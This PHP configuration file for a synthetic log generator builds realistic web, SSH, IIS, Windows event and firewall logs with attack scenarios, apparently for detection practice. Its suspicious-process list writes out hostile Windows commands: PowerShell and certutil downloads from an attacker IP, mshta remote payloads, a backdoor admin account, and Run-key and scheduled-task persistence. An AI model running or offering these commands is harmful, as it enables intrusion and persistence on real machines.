<?php
/**
 * Pulse Generator — Configuration
 * Defines pools for realistic log generation
 */

// Legitimate IP pools (RFC-safe private + realistic public-looking)
define('LEGIT_IPS', [
    '192.168.1.105', '192.168.1.112', '192.168.1.88',
    '10.0.0.45', '10.0.0.67', '10.0.0.201',
    '172.16.5.14', '172.16.5.33',
    '203.0.113.15', '203.0.113.42', '203.0.113.78', '203.0.113.101',
    '198.51.100.22', '198.51.100.55', '198.51.100.130',
    '100.24.56.91', '100.24.56.147',
    '185.220.44.12', '185.220.44.88',
    '45.33.32.156', '45.33.32.201',
    '78.46.91.34', '78.46.91.102',
    '91.189.92.10', '91.189.92.44',
    '104.26.10.78', '104.26.10.155',
]);

// Attacker IP pools (picked from these when generating attack scenarios)
define('ATTACKER_IP_POOL', [
    '185.156.73.54',
    '45.155.205.233',
    '194.26.135.89',
    '89.248.167.131',
    '162.247.74.27',
    '171.25.193.78',
    '51.222.253.18',
    '103.75.201.45',
]);

// User-Agent strings
define('USER_AGENTS', [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'curl/7.88.1',
]);

// Attacker-specific user agents (more suspicious)
define('ATTACKER_USER_AGENTS', [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'python-requests/2.31.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]);

// BrightMall legitimate URL paths
define('NORMAL_PATHS', [
    ['GET', '/', 200, [2048, 4096]],
    ['GET', '/index.php', 200, [2048, 4096]],
    ['GET', '/products.php', 200, [8192, 16384]],
    ['GET', '/product.php?id=1', 200, [3072, 5120]],
    ['GET', '/product.php?id=2', 200, [3072, 5120]],
    ['GET', '/product.php?id=3', 200, [3072, 5120]],
    ['GET', '/product.php?id=4', 200, [3072, 5120]],
    ['GET', '/product.php?id=5', 200, [3072, 5120]],
    ['GET', '/product.php?id=7', 200, [3072, 5120]],
    ['GET', '/product.php?id=12', 200, [3072, 5120]],
    ['GET', '/product.php?id=15', 200, [3072, 5120]],
    ['GET', '/category.php?cat=electronics', 200, [6144, 12288]],
    ['GET', '/category.php?cat=clothing', 200, [6144, 12288]],
    ['GET', '/category.php?cat=home', 200, [6144, 12288]],
    ['GET', '/category.php?cat=books', 200, [6144, 12288]],
    ['GET', '/page.php?file=about', 200, [1024, 2048]],
    ['GET', '/page.php?file=contact', 200, [1024, 2048]],
    ['GET', '/page.php?file=faq', 200, [1536, 2560]],
    ['GET', '/page.php?file=terms', 200, [2048, 3072]],
    ['GET', '/page.php?file=privacy', 200, [2048, 3072]],
    ['GET', '/page.php?file=shipping', 200, [1024, 2048]],
    ['GET', '/page.php?file=returns', 200, [1024, 2048]],
    ['GET', '/account/login.php', 200, [1024, 2048]],
    ['POST', '/account/login.php', 302, [0, 0]],
    ['GET', '/account/register.php', 200, [1536, 2560]],
    ['GET', '/account/profile.php', 200, [2048, 3072]],
    ['GET', '/cart.php', 200, [1024, 4096]],
    ['POST', '/cart.php?action=add', 302, [0, 0]],
    ['GET', '/search.php?q=laptop', 200, [4096, 8192]],
    ['GET', '/search.php?q=shoes', 200, [4096, 8192]],
    ['GET', '/search.php?q=headphones', 200, [4096, 8192]],
    ['GET', '/search.php?q=backpack', 200, [4096, 8192]],
    ['GET', '/assets/css/style.css', 200, [8192, 12288]],
    ['GET', '/assets/css/bootstrap.min.css', 200, [16384, 24576]],
    ['GET', '/assets/js/jquery.min.js', 200, [32768, 32768]],
    ['GET', '/assets/js/bootstrap.min.js', 200, [16384, 16384]],
    ['GET', '/assets/js/main.js', 200, [2048, 4096]],
    ['GET', '/assets/img/logo.png', 200, [4096, 8192]],
    ['GET', '/assets/img/banner.jpg', 200, [65536, 131072]],
    ['GET', '/assets/img/products/p1.jpg', 200, [32768, 65536]],
    ['GET', '/assets/img/products/p2.jpg', 200, [32768, 65536]],
    ['GET', '/assets/img/products/p3.jpg', 200, [32768, 65536]],
    ['GET', '/assets/img/products/p4.jpg', 200, [32768, 65536]],
    ['GET', '/favicon.ico', 200, [1024, 1024]],
    ['GET', '/robots.txt', 200, [128, 256]],
    ['GET', '/sitemap.xml', 200, [2048, 4096]],
    ['GET', '/api/products?page=1', 200, [4096, 8192]],
    ['GET', '/api/products?page=2', 200, [4096, 8192]],
    ['GET', '/api/cart/count', 200, [32, 64]],
]);

// 404 paths that legit users sometimes hit
define('NORMAL_404_PATHS', [
    ['GET', '/wp-login.php', 404, [256, 512]],
    ['GET', '/admin/', 404, [256, 512]],
    ['GET', '/old/index.html', 404, [256, 512]],
    ['GET', '/product.php?id=999', 404, [256, 512]],
    ['GET', '/.env', 404, [256, 512]],
]);

// Referers
define('REFERERS', [
    '-',
    'https://www.google.com/',
    'https://www.google.com/search?q=brightmall+shop',
    'https://www.google.com/search?q=buy+electronics+online',
    'https://www.bing.com/',
    'https://brightmall.local/',
    'https://brightmall.local/products.php',
    'https://brightmall.local/category.php?cat=electronics',
    'https://brightmall.local/product.php?id=3',
    'https://brightmall.local/cart.php',
    'https://brightmall.local/account/login.php',
    'https://www.facebook.com/',
    'https://t.co/abc123',
]);

// HTTP versions
define('HTTP_VERSIONS', ['HTTP/1.1', 'HTTP/1.1', 'HTTP/1.1', 'HTTP/2.0']);

// ============================================================
// SSH Configuration
// ============================================================

// Hostname for syslog
define('SSH_HOSTNAME', 'brightmall-web01');

// Legitimate SSH users (real users with accounts)
define('SSH_LEGIT_USERS', [
    'deploy', 'admin', 'webmaster', 'sysadmin', 'jenkins', 'backup',
    'devops', 'monitoring', 'appuser', 'ubuntu',
]);

// Legit SSH source IPs (internal / jump hosts)
define('SSH_LEGIT_IPS', [
    '10.0.0.5', '10.0.0.10', '10.0.0.25',
    '172.16.1.100', '172.16.1.101',
    '192.168.10.5', '192.168.10.20',
]);

// Usernames attackers try during bruteforce
define('SSH_BRUTE_USERS', [
    'root', 'admin', 'test', 'user', 'guest', 'ubuntu', 'oracle',
    'postgres', 'mysql', 'ftp', 'www-data', 'pi', 'ec2-user',
    'deploy', 'git', 'nagios', 'tomcat', 'jenkins', 'ansible',
    'vagrant', 'docker', 'redis', 'hadoop', 'elastic', 'kafka',
    'support', 'info', 'mail', 'webadmin', 'ftpuser', 'backup',
    'testuser', 'demo', 'developer', 'sysadmin', 'operator',
]);

// Invalid usernames attackers try (will generate "Invalid user" messages)
define('SSH_INVALID_USERS', [
    'test', 'guest', 'user', 'oracle', 'postgres', 'ftp',
    'pi', 'ec2-user', 'git', 'nagios', 'tomcat', 'ansible',
    'vagrant', 'docker', 'redis', 'hadoop', 'elastic', 'kafka',
    'support', 'info', 'mail', 'ftpuser', 'testuser', 'demo',
    'developer', 'operator',
]);

// SSH port
define('SSH_PORT', 22);

// SSH client versions used by legit users
define('SSH_LEGIT_CLIENTS', [
    'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6',
    'SSH-2.0-OpenSSH_9.0p1 Ubuntu-1ubuntu8.7',
    'SSH-2.0-OpenSSH_9.3p1 Ubuntu-1ubuntu3.3',
    'SSH-2.0-PuTTY_Release_0.80',
    'SSH-2.0-OpenSSH_9.6',
]);

// SSH client versions used by attackers
define('SSH_ATTACKER_CLIENTS', [
    'SSH-2.0-libssh2_1.10.0',
    'SSH-2.0-paramiko_3.4.0',
    'SSH-2.0-Go',
    'SSH-2.0-libssh-0.9.7',
    'SSH-2.0-PUTTY',
    'SSH-2.0-OpenSSH_8.2p1',
]);

// Syslog services that appear in auth.log noise
define('SYSLOG_SERVICES', [
    'systemd-logind', 'CRON', 'sudo', 'su', 'polkitd',
]);

/**
 * Format a syslog-style auth.log line
 * Format: Mon DD HH:MM:SS hostname service[pid]: message
 */
function formatAuthLogLine($timestamp, $hostname, $service, $pid, $message) {
    $dateStr = $timestamp->format('M  j H:i:s');
    // Fix single-digit day padding (syslog uses space padding)
    $day = (int)$timestamp->format('j');
    if ($day < 10) {
        $dateStr = $timestamp->format('M') . '  ' . $day . $timestamp->format(' H:i:s');
    } else {
        $dateStr = $timestamp->format('M j H:i:s');
    }
    return sprintf('%s %s %s[%d]: %s', $dateStr, $hostname, $service, $pid, $message);
}

/**
 * Helper: pick random element from array
 */
function pick($arr) {
    return $arr[array_rand($arr)];
}

/**
 * Helper: get an advanced override value, or return default
 */
function getOverride($key, $default = null) {
    return $GLOBALS['pulse_overrides'][$key] ?? $default;
}

/**
 * Helper: pick N unique random elements
 */
function pickN($arr, $n) {
    $keys = array_rand($arr, min($n, count($arr)));
    if (!is_array($keys)) $keys = [$keys];
    return array_map(fn($k) => $arr[$k], $keys);
}

/**
 * Helper: random int in range
 */
function randBetween($min, $max) {
    return mt_rand($min, $max);
}

/**
 * Format a single Apache Combined Log line
 */
function formatLogLine($ip, $timestamp, $method, $path, $httpVer, $status, $size, $referer, $ua) {
    $dateStr = $timestamp->format('d/M/Y:H:i:s O');
    return sprintf(
        '%s - - [%s] "%s %s %s" %d %d "%s" "%s"',
        $ip, $dateStr, $method, $path, $httpVer, $status, $size, $referer, $ua
    );
}

// ============================================================
// Nginx Configuration
// ============================================================

/**
 * Format a Nginx Combined Log line (with request_time + upstream)
 * Distinguishable from Apache by the extra fields at the end
 */
function formatNginxLogLine($ip, $timestamp, $method, $path, $httpVer, $status, $size, $referer, $ua, $requestTime = null, $upstreamTime = null) {
    $dateStr = $timestamp->format('d/M/Y:H:i:s O');
    $rt = $requestTime ?? (mt_rand(1, 5000) / 1000);
    $ut = $upstreamTime ?? ($rt - (mt_rand(0, 100) / 1000));
    $ut = max(0, $ut);
    return sprintf(
        '%s - - [%s] "%s %s %s" %d %d "%s" "%s" rt=%.3f uct="%.3f" uht="%.3f" urt="%.3f"',
        $ip, $dateStr, $method, $path, $httpVer, $status, $size, $referer, $ua,
        $rt, 0.000, $ut, $ut
    );
}

// ============================================================
// IIS Configuration
// ============================================================

// IIS W3C header
define('IIS_HEADER', "#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n#Date: %s\n#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\n");

// IIS server IP
define('IIS_SERVER_IP', '192.168.1.10');

// IIS ASP.NET app paths (fake corporate intranet: "NovaCRM")
define('IIS_NORMAL_PATHS', [
    ['GET', '/Default.aspx', '-', 200],
    ['GET', '/Home/Index', '-', 200],
    ['GET', '/Products/List', '-', 200],
    ['GET', '/Products/Detail', 'id=1', 200],
    ['GET', '/Products/Detail', 'id=2', 200],
    ['GET', '/Products/Detail', 'id=3', 200],
    ['GET', '/Products/Detail', 'id=5', 200],
    ['GET', '/Products/Detail', 'id=8', 200],
    ['GET', '/Content/Page', 'view=about', 200],
    ['GET', '/Content/Page', 'view=contact', 200],
    ['GET', '/Content/Page', 'view=faq', 200],
    ['GET', '/Content/Page', 'view=terms', 200],
    ['GET', '/Content/Page', 'view=careers', 200],
    ['GET', '/Account/Login', '-', 200],
    ['POST', '/Account/Login', '-', 302],
    ['GET', '/Account/Register', '-', 200],
    ['GET', '/Account/Profile', '-', 200],
    ['GET', '/Dashboard', '-', 200],
    ['GET', '/Reports/Monthly', '-', 200],
    ['GET', '/api/v1/products', 'page=1', 200],
    ['GET', '/api/v1/notifications', '-', 200],
    ['GET', '/Content/css/site.css', '-', 200],
    ['GET', '/Content/css/bootstrap.min.css', '-', 200],
    ['GET', '/Scripts/jquery-3.7.1.min.js', '-', 200],
    ['GET', '/Scripts/bootstrap.bundle.min.js', '-', 200],
    ['GET', '/Scripts/site.js', '-', 200],
    ['GET', '/Content/images/logo.png', '-', 200],
    ['GET', '/Content/images/banner.jpg', '-', 200],
    ['GET', '/favicon.ico', '-', 200],
]);

// IIS User-Agents (URL-encoded + in format)
define('IIS_USER_AGENTS', [
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:121.0)+Gecko/20100101+Firefox/121.0',
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/119.0.0.0+Safari/537.36+Edg/119.0.0.0',
    'Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)',
]);

define('IIS_ATTACKER_AGENTS', [
    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
    'python-requests/2.31.0',
    'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)',
]);

/**
 * Format an IIS W3C Extended Log line
 */
function formatIisLogLine($timestamp, $serverIp, $method, $uriStem, $uriQuery, $port, $username, $clientIp, $ua, $referer, $status, $subStatus, $win32Status, $timeTaken) {
    $dateStr = $timestamp->format('Y-m-d');
    $timeStr = $timestamp->format('H:i:s');
    return sprintf(
        '%s %s %s %s %s %s %d %s %s %s %s %d %d %d %d',
        $dateStr, $timeStr, $serverIp, $method, $uriStem, $uriQuery,
        $port, $username, $clientIp, $ua, $referer,
        $status, $subStatus, $win32Status, $timeTaken
    );
}

// ============================================================
// Windows Event Log Configuration
// ============================================================

define('WIN_HOSTNAME', 'NOVA-WEB01');
define('WIN_DOMAIN', 'NOVACORP');

// Legitimate Windows users
define('WIN_LEGIT_USERS', [
    'svc_web', 'svc_sql', 'Administrator', 'j.smith', 'a.johnson',
    'm.williams', 'b.davis', 'svc_backup', 'svc_monitor', 'SYSTEM',
]);

// Legitimate Windows workstation names
define('WIN_WORKSTATIONS', [
    'WKS-ADMIN01', 'WKS-DEV03', 'WKS-HR02', 'WKS-FIN01',
    'WKS-MKT01', 'JUMP-01', 'SRV-MGMT01',
]);

// Bruteforce target usernames
define('WIN_BRUTE_USERS', [
    'Administrator', 'admin', 'Guest', 'j.smith', 'a.johnson',
    'svc_web', 'svc_sql', 'backup', 'test', 'user',
    'helpdesk', 'support', 'sa', 'dba',
]);

// Suspicious process chains
define('WIN_SUSPICIOUS_PROCS', [
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c whoami'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c hostname'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c ipconfig /all'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net user'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net localgroup administrators'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c netstat -ano'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c tasklist'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c systeminfo'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c nltest /dclist:'],
    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net group "Domain Admins" /domain'],
    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://185.156.73.54/rev.ps1\')"'],
    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-c "Get-Process | Out-File C:\\Windows\\Temp\\p.txt"'],
    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoA'],
    ['certutil.exe', 'C:\\Windows\\System32\\certutil.exe', '-urlcache -split -f http://185.156.73.54/payload.exe C:\\Windows\\Temp\\svchost.exe'],
    ['net.exe', 'C:\\Windows\\System32\\net.exe', 'user hacker P@ssw0rd123! /add'],
    ['net.exe', 'C:\\Windows\\System32\\net.exe', 'localgroup administrators hacker /add'],
    ['reg.exe', 'C:\\Windows\\System32\\reg.exe', 'add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svchost.exe'],
    ['schtasks.exe', 'C:\\Windows\\System32\\schtasks.exe', '/create /tn "WindowsUpdate" /tr C:\\Windows\\Temp\\svchost.exe /sc onstart /ru SYSTEM'],
    ['mshta.exe', 'C:\\Windows\\System32\\mshta.exe', 'http://185.156.73.54/payload.hta'],
    ['rundll32.exe', 'C:\\Windows\\System32\\rundll32.exe', 'C:\\Windows\\Temp\\mal.dll,DllMain'],
]);

// Normal Windows processes for noise
define('WIN_NORMAL_PROCS', [
    ['svchost.exe', 'C:\\Windows\\System32\\svchost.exe', '-k netsvcs -p'],
    ['taskhostw.exe', 'C:\\Windows\\System32\\taskhostw.exe', ''],
    ['RuntimeBroker.exe', 'C:\\Windows\\System32\\RuntimeBroker.exe', '-Embedding'],
    ['SearchIndexer.exe', 'C:\\Windows\\System32\\SearchIndexer.exe', '/Embedding'],
    ['MsMpEng.exe', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0\\MsMpEng.exe', ''],
    ['w3wp.exe', 'C:\\Windows\\System32\\inetsrv\\w3wp.exe', '-ap "DefaultAppPool"'],
    ['sqlservr.exe', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe', '-sMSSQLSERVER'],
    ['conhost.exe', 'C:\\Windows\\System32\\conhost.exe', '0x4'],
    ['WmiPrvSE.exe', 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', ''],
    ['spoolsv.exe', 'C:\\Windows\\System32\\spoolsv.exe', ''],
]);

/**
 * Format a Windows Event Log CSV line
 */
function formatWinEventLine($timestamp, $eventId, $level, $computer, $source, $message) {
    $dateStr = $timestamp->format('Y-m-d\TH:i:s.v\Z');
    // Escape CSV fields
    $message = '"' . str_replace('"', '""', $message) . '"';
    return sprintf('%s,%d,%s,%s,%s,%s',
        $dateStr, $eventId, $level, $computer, $source, $message
    );
}

// ============================================================
// Firewall (iptables) Configuration
// ============================================================

define('FW_HOSTNAME', 'fw-gw01');
define('FW_INTERNAL_NET', '192.168.1.');
define('FW_DMZ_NET', '10.10.10.');
define('FW_SERVER_IP', '10.10.10.5');

// Common legitimate destination ports
define('FW_LEGIT_PORTS', [80, 443, 53, 123, 8080, 3306, 5432, 22, 25, 587, 993]);

// Common legitimate external IPs (CDN, DNS, etc.)
define('FW_LEGIT_DEST_IPS', [
    '8.8.8.8', '8.8.4.4', '1.1.1.1',              // DNS
    '13.107.42.14', '13.107.21.200',                // Microsoft
    '142.250.80.46', '142.250.80.78',               // Google
    '104.16.132.229', '104.16.133.229',             // Cloudflare
    '151.101.1.69', '151.101.65.69',                // Reddit/Fastly
    '52.96.108.34', '52.96.110.18',                 // O365
    '34.120.54.55', '35.186.238.101',               // GCP
]);

// C2 server IPs (for beaconing scenario)
define('FW_C2_IPS', [
    '185.156.73.54',
    '45.155.205.233',
    '194.26.135.89',
]);

/**
 * Format an iptables-style firewall log line
 */
function formatFwLogLine($timestamp, $hostname, $action, $inIf, $outIf, $srcIp, $dstIp, $proto, $srcPort, $dstPort, $extra = '') {
    $day = (int)$timestamp->format('j');
    if ($day < 10) {
        $dateStr = $timestamp->format('M') . '  ' . $day . $timestamp->format(' H:i:s');
    } else {
        $dateStr = $timestamp->format('M j H:i:s');
    }
    $kernTs = mt_rand(100000, 999999) . '.' . mt_rand(100, 999);
    $mac = sprintf('00:50:56:%02x:%02x:%02x:00:0c:29:%02x:%02x:%02x:08:00',
        mt_rand(0,255), mt_rand(0,255), mt_rand(0,255),
        mt_rand(0,255), mt_rand(0,255), mt_rand(0,255));

    $line = sprintf(
        '%s %s kernel: [%s] [%s] IN=%s OUT=%s MAC=%s SRC=%s DST=%s LEN=%d TOS=0x00 PREC=0x00 TTL=%d ID=%d PROTO=%s',
        $dateStr, $hostname, $kernTs, $action,
        $inIf, $outIf, $mac, $srcIp, $dstIp,
        mt_rand(40, 1500), mt_rand(48, 128), mt_rand(1, 65535), $proto
    );

    if ($proto === 'TCP' || $proto === 'UDP') {
        $line .= sprintf(' SPT=%d DPT=%d', $srcPort, $dstPort);
    }
    if ($proto === 'TCP') {
        $flags = $extra ?: 'SYN';
        $line .= ' WINDOW=' . mt_rand(8192, 65535) . ' RES=0x00 ' . $flags . ' URGP=0';
    }
    if ($proto === 'UDP') {
        $line .= ' LEN=' . mt_rand(20, 512);
    }
    if ($proto === 'ICMP') {
        $line .= ' TYPE=8 CODE=0 ID=' . mt_rand(1, 65535) . ' SEQ=' . mt_rand(1, 100);
    }

    return $line;
}
